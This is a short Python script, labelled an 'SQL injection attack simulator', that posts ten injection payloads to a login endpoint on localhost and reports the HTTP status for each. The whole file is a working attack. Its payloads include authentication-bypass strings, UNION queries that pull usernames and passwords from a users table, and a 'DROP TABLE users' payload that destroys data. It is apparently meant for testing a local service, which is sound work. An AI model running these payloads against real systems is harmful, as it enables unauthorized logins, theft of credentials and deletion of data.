import requests
import time
from colorama import Fore, init

init(autoreset=True)

TARGET = "http://localhost:8001/api/root/override"

payloads = [
    {"username": "admin' OR '1'='1", "password": "anything"},
    {"username": "' UNION SELECT * FROM users--", "password": "x"},
    {"username": "admin'--", "password": "x"},
    {"username": "' OR 1=1--", "password": "x"},
    {"username": "admin'; DROP TABLE users;--", "password": "x"},
    {"username": "' OR 'x'='x", "password": "x"},
    {"username": "1' OR '1' = '1'/*", "password": "x"},
    {"username": "admin' #", "password": "x"},
    {"username": "' UNION SELECT null,null--", "password": "x"},
    {"username": "' AND 1=0 UNION SELECT username,password FROM users--", "password": "x"},
]

print(Fore.RED + "=" * 55)
print(Fore.RED + "  SQL INJECTION ATTACK SIMULATOR")
print(Fore.RED + "  Target: " + TARGET)
print(Fore.RED + "=" * 55)

for i, payload in enumerate(payloads, 1):
    try:
        resp = requests.post(TARGET, json=payload, timeout=5)
        status_color = Fore.GREEN if resp.status_code == 200 else Fore.YELLOW
        print(f"{Fore.CYAN}[{i:02d}] {Fore.WHITE}Payload: {payload['username'][:40]}")
        print(f"     {status_color}→ Status: {resp.status_code}")
    except Exception as e:
        print(f"{Fore.RED}[{i:02d}] ERROR: {e}")
    time.sleep(0.3)

print(Fore.RED + "\n[DONE] SQL Injection simulation complete!")